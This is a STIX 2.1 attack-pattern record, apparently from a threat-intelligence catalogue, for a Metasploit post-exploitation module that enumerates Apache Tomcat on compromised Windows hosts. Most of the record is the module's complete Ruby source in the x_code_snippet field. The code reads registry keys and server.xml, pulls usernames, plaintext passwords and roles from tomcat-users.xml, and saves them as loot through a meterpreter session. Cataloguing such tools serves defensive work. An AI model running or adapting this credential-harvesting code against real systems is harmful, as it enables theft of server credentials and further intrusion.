{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7632c7ee-98e1-47bf-b00d-40209659002c",
    "created": "2024-08-14T16:33:05.031287Z",
    "modified": "2024-08-14T16:33:05.03129Z",
    "name": "Windows Gather Apache Tomcat Enumeration",
    "description": " This module will collect information from a Windows-based Apache Tomcat. You will get information such as: The installation path, Tomcat version, port, web applications users, passwords, roles, etc.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_tomcat.rb",
            "external_id": "enum_tomcat.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Apache Tomcat Enumeration',\n        'Description' => %q{\n          This module will collect information from a Windows-based Apache Tomcat. You will get\n          information such as: The installation path, Tomcat version, port, web applications,\n          users, passwords, roles, etc.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Barry Shteiman <barry[at]sectorix.com>', # Module author\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  # method called when command run is issued\n  def run\n    installs = []\n    results = []\n    users = []\n    print_status(\"Enumerating Tomcat Servers on #{sysinfo['Computer']}\")\n    if check_tomcat\n      installs += identify_registry\n      if !installs.empty?\n        installs.each do |inst|\n          results += enumerate_tomcat(inst[0], inst[1])\n          users += enumerate_tomcat_creds(inst[0])\n        end\n      else\n        print_status('Done, Tomcat Not Found')\n        return\n      end\n    end\n    if results.empty?\n      print_status('Done, Tomcat Not Found')\n      return\n    end\n    print_status('Done, Tomcat Found.')\n\n    tbl_services = Rex::Text::Table.new(\n      'Header' => 'Tomcat Applications ',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Host',\n          'Tomcat Version',\n          'Port',\n          'Web Application'\n        ]\n    )\n\n    results.each do |r|\n      report_service(host: session.sock.peerhost, port: r[2], name: 'http', info: \"#{r[0]} Tomcat #{r[1]}, Application:#{r[3]}\")\n      tbl_services << r\n    end\n\n    tbl_users = Rex::Text::Table.new(\n      'Header' => 'Tomcat Server Users ',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Host',\n          'User',\n          'Password',\n          'Roles'\n        ]\n    )\n\n    users.each do |u|\n      tbl_users << [ session.sock.peerhost, u[0], u[1], u[2] ]\n    end\n\n    print_line\n    print_line(tbl_services.to_s)\n    print_line(tbl_users.to_s)\n    p = store_loot('host.webservers.tomcat', 'text/plain', session, tbl_services.to_s + \"\\n\" + tbl_users.to_s, 'tomcat.txt', 'Tomcat Server Enum')\n    print_good(\"Results stored in: #{p}\")\n  end\n\n  ### initial identification methods ###\n\n  # method for checking if webserver is installed on server - tomcat\n  def check_tomcat\n    key = 'HKLM\\\\SOFTWARE\\\\Apache Software Foundation'\n    if registry_enumkeys(key).include?('Tomcat')\n      print_status(\"\\tTomcat found.\")\n      return true\n    end\n    return false\n  rescue StandardError\n    return false\n  end\n\n  ### deep server enumeration methods ###\n\n  # enumerate tomcat\n  def enumerate_tomcat(val_installpath, val_version)\n    results = []\n    found = false\n    print_good(\"\\t\\t+ Version: #{val_version}\")\n    print_good(\"\\t\\t+ Path: #{val_installpath}\")\n\n    if !exist?(val_installpath + '\\\\conf\\\\server.xml')\n      print_error(\"\\t\\t! tomcat configuration not found\")\n      return results\n    end\n\n    appname = find_application_name(val_installpath)\n\n    ports = []\n    xml_data = read_file(val_installpath + '\\\\conf\\\\server.xml')\n    doc = REXML::Document.new(xml_data)\n    doc.elements.each('Server/Service/Connector') do |e|\n      ports << e.attributes['port']\n    end\n    ports.uniq.each do |p|\n      print_good(\"\\t\\t+ Port: #{p}\")\n      found = true\n      results << [session.sock.peerhost, val_version.to_s, p, appname]\n    end\n    if found\n      print_good(\"\\t\\t+ Application: [#{appname}]\")\n    else\n      print_error(\"\\t\\t! port not found\")\n    end\n    return results\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify information\")\n    return results || []\n  end\n\n  # enumerate tomcat users from its user base\n  def enumerate_tomcat_creds(val_installpath)\n    users = []\n    userpath = val_installpath + '\\\\conf\\\\tomcat-users.xml'\n    if exist?(userpath)\n      xml_data = read_file(userpath)\n      doc = REXML::Document.new(xml_data)\n\n      if !doc.elements.empty?\n        doc.elements.each('tomcat-users/user') do |e|\n          e_user = e.attributes['name']\n          if !e_user.empty?\n            e_user = e.attributes['name']\n          else\n            e.user = e_user = e.attributes['username']\n          end\n          users << [ e_user, e.attributes['password'], e.attributes['roles'] ]\n          print_good(\"\\t\\t+ User:[#{e_user}] Pass:[#{e.attributes['password']}] Roles:[#{e.attributes['roles']}]\")\n        end\n      else\n        print_error(\"\\t\\t! No Users Found\")\n        return users\n      end\n    end\n\n    return users\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify users\")\n    return users || []\n  end\n\n  ### helper functions ###\n\n  # this method identifies the correct registry path to tomcat details, and returns [path,version]\n  def identify_registry\n    values = []\n    basekey = 'HKLM\\\\SOFTWARE\\\\Apache Software Foundation\\\\Tomcat'\n    instances = registry_enumkeys(basekey)\n    if !instances.nil? && !instances.empty?\n      instances.each do |i|\n        major_version_key = \"#{basekey}\\\\#{i}\"\n        services = registry_enumkeys(major_version_key)\n\n        if services.empty?\n          val_installpath = registry_getvaldata(major_version_key, 'InstallPath')\n          val_version = registry_getvaldata(major_version_key, 'Version')\n          values << [val_installpath, val_version]\n        else\n          services.each do |s|\n            service_key = \"#{major_version_key}\\\\#{s}\"\n            val_installpath = registry_getvaldata(service_key, 'InstallPath')\n            val_version = registry_getvaldata(service_key, 'Version')\n            values << [val_installpath, val_version]\n          end\n        end\n      end\n    end\n    return values\n  rescue StandardError\n    print_error(\"\\t\\t! failed to locate install path\")\n    return nil || []\n  end\n\n  # this function extracts the application name from the main page of the web application\n  def find_application_name(val_installpath)\n    index_file = ['index.html', 'index.htm', 'index.php', 'index.jsp', 'index.asp']\n    path = val_installpath + '\\\\webapps'\n    if !directory?(path + '\\\\ROOT')\n      print_error(\"\\t\\t! expected directory wasnt found\")\n      return 'Unknown'\n    end\n\n    index_file.each do |i|\n      if !exist?(\"#{path}\\\\ROOT\\\\#{i}\")\n        next\n      end\n\n      data = read_file(path + \"\\\\ROOT\\\\#{i}\")\n      if data =~ %r{(?i)<title>([^<]+)</title>}\n        return ::Regexp.last_match(1)\n      elsif data =~ %r{(?i)onload=\"?document\\.location=['\"]?([/\\w\\d]+)['\"]?\"?}\n        # look for redirect as name\n        return ::Regexp.last_match(1).gsub('/', '')\n      end\n    end\n    return 'Unknown'\n  rescue StandardError\n    print_error(\"\\t\\t! could not identify application name\")\n    return 'Unknown'\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}